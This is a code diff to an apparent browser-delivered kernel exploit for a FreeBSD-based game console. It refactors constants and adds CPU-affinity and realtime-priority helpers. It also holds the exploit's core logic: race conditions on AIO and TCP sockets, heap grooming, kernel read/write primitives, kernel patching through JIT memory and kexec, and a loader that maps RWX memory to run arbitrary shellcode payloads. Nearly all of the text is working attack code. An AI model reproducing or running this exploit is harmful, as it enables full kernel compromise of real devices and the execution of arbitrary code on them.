@@ -123,8 +123,8 @@ const AF_INET6 = 28;
 const SOCK_STREAM = 1;
 const SOCK_DGRAM = 2;
 const SOL_SOCKET = 0xffff;
-const SO_REUSEADDR = 4;
-const SO_LINGER = 0x80;
+const SO_REUSEADDR = 0x0004;
+const SO_LINGER = 0x0080;
 
 // netinet/in.h
 const IPPROTO_TCP = 6;
@@ -132,8 +132,8 @@ const IPPROTO_UDP = 17;
 const IPPROTO_IPV6 = 41;
 
 // netinet/tcp.h
-const TCP_INFO = 0x20;
-const size_tcp_info = 0xec;
+const TCP_INFO = 32;
+const sizeof_tcp_info_ = 0xec;
 
 // netinet/tcp_fsm.h
 const TCPS_ESTABLISHED = 4;
@@ -148,17 +148,24 @@ const IPV6_TCLASS = 61;
 // sys/cpuset.h
 const CPU_LEVEL_WHICH = 3;
 const CPU_WHICH_TID = 1;
+const sizeof_cpuset_t_ = 0x10;
 
 // sys/mman.h
-const PROT_READ = 1;
-const PROT_WRITE = 2;
-const PROT_EXEC = 4;
-const MAP_SHARED = 1;
-const MAP_FIXED = 0x10;
+const PROT_READ = 0x01;
+const PROT_WRITE = 0x02;
+const PROT_EXEC = 0x04;
+const MAP_SHARED = 0x0001;
+const MAP_FIXED = 0x0010;
+const MAP_ANON = 0x1000;
+const MAP_PREFAULT_READ = 0x00040000;
 
 // sys/rtprio.h
+const RTP_LOOKUP = 0;
 const RTP_SET = 1;
+// const RTP_PRIO_ITHD = 1;
 const RTP_PRIO_REALTIME = 2;
+// const RTP_PRIO_NORMAL = 3;
+// const RTP_PRIO_IDLE = 4;
 
 // SceAIO has 2 SceFsstAIO workers for each SceAIO Parameter. each Parameter
 // has 3 queue groups: 4 main queues, 4 wait queues, and one unused queue
@@ -394,12 +401,50 @@ function free_aios2(ids_p, num_ids) {
   }
 }
 
-function get_our_affinity(mask) {
-  sysi("cpuset_getaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 8, mask.addr);
+function get_cpu_affinity(mask) {
+  sysi("cpuset_getaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, sizeof_cpuset_t_, mask.addr);
 }
 
-function set_our_affinity(mask) {
-  sysi("cpuset_setaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 8, mask.addr);
+function set_cpu_affinity(mask) {
+  sysi("cpuset_setaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, sizeof_cpuset_t_, mask.addr);
+}
+
+function pin_to_core(core) {
+  const mask = new Buffer(sizeof_cpuset_t_);
+  mask.write32(0, 1 << core);
+  set_cpu_affinity(mask);
+}
+
+function get_core_index(mask) {
+  let num = mem.read32(mask.addr);
+  let position = 0;
+  while (num > 0) {
+    num = num >>> 1;
+    position += 1;
+  }
+  return position - 1;
+}
+
+function get_current_core() {
+  const mask = new Buffer(sizeof_cpuset_t_);
+  get_cpu_affinity(mask);
+  return get_core_index(mask);
+}
+
+function get_current_rtprio() {
+  const _rtprio = new Buffer(4);
+  sysi("rtprio_thread", RTP_LOOKUP, 0, _rtprio.addr);
+  return {
+    type: _rtprio.read16(0),
+    prio: _rtprio.read16(2),
+  };
+}
+
+function set_rtprio(rtprio_obj) {
+  const _rtprio = new Buffer(4);
+  _rtprio.write16(0, rtprio_obj.type);
+  _rtprio.write16(2, rtprio_obj.prio);
+  sysi("rtprio_thread", RTP_SET, 0, _rtprio.addr);
 }
 
 function close(fd) {
@@ -619,12 +664,12 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
     aio_multi_poll(request_addr, 1, poll_err.addr);
     log(`poll: ${hex(poll_err[0])}`);
 
-    const info_buf = new View1(size_tcp_info);
+    const info_buf = new View1(sizeof_tcp_info_);
     const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf);
     log(`info size: ${hex(info_size)}`);
 
-    if (info_size !== size_tcp_info) {
-      die(`info size isn't ${size_tcp_info}: ${info_size}`);
+    if (info_size !== sizeof_tcp_info_) {
+      die(`info size isn't ${sizeof_tcp_info_}: ${info_size}`);
     }
 
     const tcp_state = info_buf[0];
@@ -1482,15 +1527,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   kmem.write64(w_rthdr_p, 0);
   log("corrupt pointers cleaned");
 
-  /*
-    // REMOVE once restore kernel is ready for production
-    // increase the ref counts to prevent deallocation
-    kmem.write32(main_sock, kmem.read32(main_sock) + 1);
-    kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
-    // +2 since we have to take into account the fget_write()'s reference
-    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
-    */
-
   return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
@@ -1559,7 +1595,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   const exec_p = new Int(0, 9);
   const write_p = new Int(max_size, 9);
 
-  log("open JIT fds")
+  log("open JIT fds");
   const exec_fd = sysi("jitshm_create", 0, map_size, prot_rwx);
   const write_fd = sysi("jitshm_alias", exec_fd, prot_rw);
 
@@ -1597,7 +1633,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   restore_info[4] = sysent_661_save.addr;
   sysi("mlock", restore_info[4], page_size);
 
-  log("execute kpatch...")
+  log("execute kpatch...");
   mem.cpy(write_addr, patches.addr, patches.size);
   sys_void("kexec", exec_addr, ...restore_info);
 
@@ -1674,22 +1710,28 @@ export async function kexploit() {
     // Expected when not in an exploited state
   }
 
+  // Get current core/rtprio
+  const current_core = get_current_core();
+  const current_rtprio = get_current_rtprio();
+  log(`current core: ${current_core}`);
+  log(`current rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
+
   // fun fact:
   // if the first thing you do since boot is run the web browser, WebKit can
   // use all the cores
-  const main_mask = new Long();
-  get_our_affinity(main_mask);
+  const main_mask = new Buffer(sizeof_cpuset_t_);
+  get_cpu_affinity(main_mask);
   log(`main_mask: ${main_mask}`);
 
   // pin to 1 core so that we only use 1 per-cpu bucket. this will make heap
   // spraying and grooming easier
   log(`pinning process to core #${main_core}`);
-  set_our_affinity(new Long(1 << main_core));
-  get_our_affinity(main_mask);
+  pin_to_core(main_core);
+  get_cpu_affinity(main_mask);
   log(`main_mask: ${main_mask}`);
 
   log("setting main thread's priority");
-  sysi("rtprio_thread", RTP_SET, 0, rtprio.addr);
+  set_rtprio({ type: RTP_PRIO_REALTIME, prio: 0x100 });
 
   const [block_fd, unblock_fd] = (() => {
     const unix_pair = new View4(2);
@@ -1723,7 +1765,9 @@ export async function kexploit() {
     log("\nSTAGE: Patch kernel");
     await patch_kernel(kbase, kmem, p_ucred, restore_info);
   } finally {
-    close(unblock_fd);
+    if (unblock_fd !== undefined && unblock_fd !== null) {
+      close(unblock_fd);
+    }
 
     const t2 = performance.now();
     const ftime = t2 - t1;
@@ -1734,13 +1778,25 @@ export async function kexploit() {
     log(`time to init: ${(_init_t1 - t1) / 1000}`);
     log(`time - init time: ${(ftime - init_time) / 1000}`);
   }
-  close(block_fd);
-  free_aios2(groom_ids.addr, groom_ids.length);
-  aio_multi_wait(block_id.addr, 1);
-  aio_multi_delete(block_id.addr, block_id.length);
+  if (block_fd !== undefined && block_fd !== null) {
+    close(block_fd);
+  }
+  if (groom_ids) {
+    free_aios2(groom_ids.addr, groom_ids.length);
+  }
+  if (block_id !== null) {
+    aio_multi_wait(block_id.addr, 1);
+    aio_multi_delete(block_id.addr, block_id.length);
+  }
   for (const sd of sds) {
     close(sd);
   }
+
+  // Restore core/rtprio
+  log(`restoring core: ${current_core}`);
+  log(`restoring rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
+  pin_to_core(current_core);
+  set_rtprio(current_rtprio);
 
   // Check if it all worked
   log("setuid(0)");
@@ -1781,14 +1837,14 @@ function array_from_address(addr, size) {
   const og_array_i = mem.addrof(og_array).add(0x10);
   mem.write64(og_array_i, addr);
   mem.write32(og_array_i.add(0x8), size);
-  mem.write32(og_array_i.add(0xC), 0x1);
+  mem.write32(og_array_i.add(0xc), 1);
   nogc.push(og_array);
   return og_array;
 }
 
 // ChendoChap's from pOOBs4
 function runBinLoader() {
-  const payload_buffer = chain.sysp("mmap", 0x0, 0x300000, 0x7, 0x1000, 0xffffffff, 0);
+  const payload_buffer = chain.sysp("mmap", 0, 0x300000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON, -1, 0);
   const payload_loader = malloc32(0x1000);
   const loader_writer = payload_loader.backing;
   loader_writer[0] = 0x56415741;
@@ -1858,7 +1914,7 @@ function runBinLoader() {
 
   {
     sysi("mlock", payload_buffer, 0x300000);
-    call_nze("pthread_create", pthread, 0x0, payload_loader, payload_buffer);
+    call_nze("pthread_create", pthread, 0, payload_loader, payload_buffer);
   }
 
   log("awaiting payload...");
@@ -1890,7 +1946,7 @@ function runPayload(path) {
           const shellcode = new Uint32Array(padded_buffer.buffer);
 
           // Map memory with RWX permissions to load the payload into
-          const payload_buffer = chain.sysp('mmap', 0x0, padded_buffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, 0xffffffff, 0);
+          const payload_buffer = chain.sysp("mmap", 0, padded_buffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PREFAULT_READ, -1, 0);
           log(`payload buffer allocated at ${payload_buffer}`);
 
           // Create an JS array that "shadows" the mapped location
